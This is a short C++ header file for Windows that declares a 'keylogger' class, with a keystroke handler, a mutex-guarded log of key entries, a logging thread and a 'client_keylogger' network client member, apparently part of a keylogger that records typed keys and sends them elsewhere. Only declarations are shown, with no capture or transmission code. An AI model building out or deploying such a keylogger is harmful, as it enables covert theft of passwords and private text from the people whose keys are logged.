#pragma once

#ifdef _WIN32
#define _WIN32_WINNT 0x0A00
#endif

#include "WinSock2.h"
#include <Windows.h>
#include <fstream>
#include <iostream>
#include <mutex>
#include <thread>
#include <vector>

#include "client_keylogger.h"
#include "common.h"
#include "kqnet.h"

class keylogger {
  public:
    keylogger();
    ~keylogger();
    void handleKeyStroke(DWORD virtualKeyCode, keyStatus status,
                         uint16_t modifierKeysBitMask);

    class LogEntry {
      public:
        LogEntry(char character, keyStatus status, uint16_t modifierKeysBitMask)
            : character(character), status(status),
              modifierKeysBitMask(modifierKeysBitMask) {}
        char character;
        keyStatus status;
        uint16_t modifierKeysBitMask;
    };

  private:
    client_keylogger client;
    std::thread logThread;
    std::vector<LogEntry> log;
    std::mutex logMutex;
};